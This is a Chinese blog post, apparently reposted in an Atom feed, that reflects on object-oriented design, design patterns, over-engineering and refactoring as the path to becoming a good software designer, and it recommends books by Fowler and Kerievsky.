<p>　　开发语言在不断发展，从机器语言，到汇编，到高级语言，再到第四代语言;软件开发方法在不断发展，从面向过程，面向对象，到面向方面等。虽然这些都在不断发展，但其所追求的目标却一直没变，这些目标就是：</p>
<p>　　1. 降低软件开发的复杂度</p>
<p>　　2. 提高软件开发的效率</p>
<p>　　3. 提高软件质量：可维护性，可扩展性，可重用性等。</p>
<p>　　其中语言的发展，开发方法的发展在1,2两条上面取得了极大的进步，但对于第3条，我们不能光指望开发方法本身来解决。</p>
<p>　　提高软件质量：可维护性，可扩展性，可重用性等，再具体点，就是高内聚、低耦合，面向对象就是为了解决第3条的问题。因此要成为一个好的程序员，最绕不开的就是面向对象了。</p>
<p>　　二、 要想学好面向对象，就必须学习设计模式。</p>
<p>　　假定我们了解了面向对象的目的，概念了，但是我们coding过程中却发现，我们的面向对象的知识似乎一直派不上用场，其实道理很简单，是因为 我们不知道怎么去用，就像游泳一样，我们已经明白了游泳的好处，以及游泳的几种姿势，狗刨、仰泳、蛙泳、自由泳，但是我们依然不会游泳。。。。</p>
<p>　　因此有了这些基本原则是不行的，我们必须有一些更细的原则去指导我们的设计，这就有了更基础的面向对象的五大原则，而把这几种原则更详细的应用 到实际中来，解决实际的问题，这就是设计模式。因此要学好OO，必须要学习设计模式，学习设计模式，按大师的话说，就是在人类努力解决的许多领域的成功方 案都来源于各种模式，教育的一个重要目标就是把知识的模式一代一代传下去。</p>
<p>　　因此学习设计模式，就像我们在看世界顶级的游泳比赛，我们为之疯狂，为之着迷。</p>
<p>　　三、学习设计模式</p>
<p>　　正像我们并不想只是看别人表演，我们要自己学会游泳，这才是我们的目的所在。</p>
<p>　　当我们看完几篇设计模式后，我们为之精神振奋，在新的coding的时候，我们总是想努力的用上学到的设计模式，但是经常在误用模式，折腾半天发现是在脱裤子抓痒。。。</p>
<p>　　当学完设计模式之后，我们又很困惑，感觉这些模式简直太像了，很多时候我们分不清这些模式之间到底有什么区别，而且明白了设计过程中的一个致命 的东西——过度设计，因为设计模式要求我们高扩展性，高重用性，但是在需求提出之初，我们都不是神，除了依靠过去的经验来判断外，我们不知道哪些地方要扩 展，哪些地方要重用，而且过去的经验就一定是正确的吗？所以我们甚至不敢再轻易用设计模式，而是还一直在用面向过程的方法在实现需求。</p>
<p>　　四、学习重构</p>
<p>　　精彩的代码是怎么想出来的，比看到精彩的代码更加令人期待。于是我们开始思考，这些大师们莫非不用工作，需求来了没有领导规定完成时间，只以设 计精彩的代码为标准来开展工作？这样的工作太爽了，也不可能，老板不愿意啊。就算这些理想的条件他都有，他就一开始就设计出完美的代码来了？也不可能啊， 除非他是神，一开始就预料到未来的所有需求，那既然这些条件都没有，他们如何写出的精彩代码？</p>
<p>　　Joshua Kerievsky在那篇著名的《模式与XP》〔收录于《极限编程研究》一书）中明白地指出：在设计前期使用模式常常导致过度工程（over- engineering)。这是一个残酷的现实，单凭对完美的追求无法写出实用的代码，而「实用」是软件压倒一切的要素。</p>
<p>　　在《重构——改善既有的代码的设计》一书中提到，通过重构（refactoring），你可以找出改变的平衡点。你会发现所谓设计不再是一切动 作的前提，而是在整个开发过程中逐渐浮现出来。在系统构筑过程中，你可以学习如何强化设计；其间带来的互动可以让一个程序在开发过程中持续保有良好的设 计。</p>
<p>　　总结起来就是说，我们在设计前期就使用设计模式，往往导致设计过度，因此应该在整个开发过程，整个需求变更过程中不断的重构现在的代码，才能让 程序一直保持良好的设计。由此可见，开发过程中需要一直重构，否则无论当初设计多么的好，随着需求的改变，都会变成一堆烂代码，难以维护，难以扩展。所谓 重构是这样一个过程：「在不改变代码外在行为的前提下，对代码做出修改，以改进程序的内部结构」。重构的目标，就是设计模式，更本质的讲就是使程序的架构 更趋合理，从而提高软件的可维护性，可扩展性，可重用性。</p>
<p>　　《重构——改善既有的代码的设计》一书也是Martin Fowler等大师的作品，软件工程领域的超级经典巨著，与另一巨著《设计模式》并称”软工双雄”，不可不读啊。</p>
<p>　　五、开始通往优秀软件设计师的路上</p>
<p>　　通过设计模式和重构，我们的所学和我们工作的coding终于结合上了，我们可以在工作中用面向对象的思维去考虑问题，并开始学习重构了。这就 像游泳一样，我们看完了各种顶级的游泳比赛，明白各种规则，名人使用的方法和技巧，现在是时候回家去村旁边的小河里练练了。练习也是需要有教练的，推荐另 一本经典书叫《重构与模式》，引用他开篇的介绍，本书开创性地深入揭示了重构与模式这两种软件开发关键技术之间的联系，说明了通过重构实现模式改善既有的 设计，往往优于在新的设计早期使用模式。本书不仅展示了一种应用模式和重构的创新方法，而且有助于读者结合实战深入理解重构和模式。</p>
<p>　　这本书正是我们需要的教练，值得一读。</p>
<p>　　六、没有终点，只有坚持不懈的专研和努力。</p>
<p>　　经过了几年的坚持，终于学会了灵活的运用各种模式，我们不需要去刻意的想用什么模式，怎么重构。程序的目标，就是可维护性，可扩展性，可重用 性，都已经成了一种编程习惯，一种思维习惯，就像我们练习了几年游泳之后，我们不用再刻意的去考虑，如何让自己能在水上漂起来，仰泳和蛙泳的区 别….. 而是跳进水里，就自然的游了起来，朝对岸游去。但是要和大师比起来，嘿嘿，我们还有很长的路要走，最终也可能成不了大师，但无论能不能成为大师，我们已经 走在了成为大师的正确的路上，我们和别的程序员已经开始不一样，因为他们无论再过多少年，他们的水平不会变，只是在重复造轮子，唯一比你快的，就是 Ctrl+C和Ctrl+V。</p>
<p>　　正确的路上，只要坚持，就离目标越来越近，未来就一定会是一个优秀的架构师，和优秀架构师的区别，可能只是时间问题。</p>
<p><strong>转自<a href="http://www.cnblogs.com/leefan/p/5489984.html" target="_blank" rel="external">李凡的博客</a></strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;读了这篇文章之后感觉蛮受启发的，在此分享一下，献给和我一样处于困惑的朋友。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;正文如下：&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Web" scheme="http://akkuman.coding.me/categories/Web/"/>
    
    
      <category term="life" scheme="http://akkuman.coding.me/tags/life/"/>
    
  </entry>
  
</feed>
